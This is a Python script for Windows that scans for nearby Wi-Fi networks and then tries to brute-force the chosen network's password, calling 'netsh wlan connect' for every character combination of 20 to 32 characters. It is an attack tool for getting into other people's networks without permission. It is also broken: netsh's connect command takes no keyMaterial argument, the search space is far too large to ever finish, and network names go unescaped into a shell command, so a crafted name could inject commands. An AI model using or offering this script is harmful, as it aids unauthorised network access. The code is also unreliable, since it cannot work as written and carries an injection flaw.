import subprocess
import string
import time
from itertools import product

# Define the password length range
min_length = 20
max_length = 32

# Define the character set to generate passwords from
charset = string.ascii_letters + string.digits + string.punctuation

# Define the function to scan for Wi-Fi networks
def scan_wifi():
    # Use the Windows netsh command to scan for Wi-Fi networks
    cmd_output = subprocess.run(["netsh", "wlan", "show", "network", "mode=Bssid"], capture_output=True).stdout.decode()

    # Extract the network names from the command output
    network_names = []
    lines = cmd_output.split('\n')
    for i in range(len(lines)):
        line = lines[i].strip()
        if line.startswith("SSID"):
            network_names.append(line.split(':')[1].strip())
    
    # Print the detected network names
    print("Detected Wi-Fi Networks:")
    for i in range(len(network_names)):
        print(f"{i+1}. {network_names[i]}")
    
    # Ask the user which network to connect to
    selection = int(input("Enter the number of the network to connect to: "))
    if selection < 1 or selection > len(network_names):
        print("Invalid selection.")
        return
    selected_network = network_names[selection-1]

    # Use the brute force function to try to connect to the selected network
    brute_force_password(selected_network)

# Define the function to brute-force a password for a given network
def brute_force_password(network_name):
    # Loop through all possible password lengths
    for length in range(min_length, max_length + 1):
        # Generate all possible password combinations for the current length
        for combination in product(charset, repeat=length):
            # Convert the combination to a string
            password = "".join(combination)
            # Attempt to connect to the network using the current password
            cmd = f'netsh wlan connect name="{network_name}" ssid="{network_name}" keyMaterial="{password}"'
            result = subprocess.run(cmd, capture_output=True, shell=True)
            print(f"Attempted password: {password}")
            # Check if the connection was successful
            if "successfully" in result.stdout.decode().lower():
                print(f"Success! Password for network {network_name}: {password}")
                return
            # Wait for .01 seconds before trying the next password
            time.sleep(0.01)
    
    # If no password was found, print a failure message
    print(f"Failed to find password for network {network_name}.")

# Call the scan_wifi function
scan_wifi()
